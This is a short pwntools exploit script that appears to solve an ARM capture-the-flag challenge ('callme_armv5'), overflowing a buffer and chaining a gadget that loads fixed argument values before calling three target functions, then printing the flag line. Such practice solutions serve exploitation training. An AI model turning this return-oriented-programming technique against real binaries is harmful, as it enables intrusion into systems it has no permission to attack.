from pwn import *

BINARY = "./callme_armv5"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

pop_r012_lr_pc = 0x00010870
callme_one = 0x00010618
callme_two = 0x0001066C
callme_three = 0x0001060C

p = remote("0.0.0.0", 8888)

rop = b"A" * 0x24
rop += p32(pop_r012_lr_pc)  # pop {r0, r1, r2, lr, pc}
rop += p32(0xDEADBEEF)  # r0
rop += p32(0xCAFEBABE)  # r1
rop += p32(0xD00DF00D)  # r2
rop += p32(pop_r012_lr_pc)
rop += p32(callme_one)

rop += p32(0xDEADBEEF)  # r0
rop += p32(0xCAFEBABE)  # r1
rop += p32(0xD00DF00D)  # r2
rop += p32(pop_r012_lr_pc)
rop += p32(callme_two)

rop += p32(0xDEADBEEF)  # r0
rop += p32(0xCAFEBABE)  # r1
rop += p32(0xD00DF00D)  # r2
rop += p32(pop_r012_lr_pc)
rop += p32(callme_three)

p.recvuntil(b"> ")
p.sendline(rop)
print(p.recvline_contains(b"ROPE"))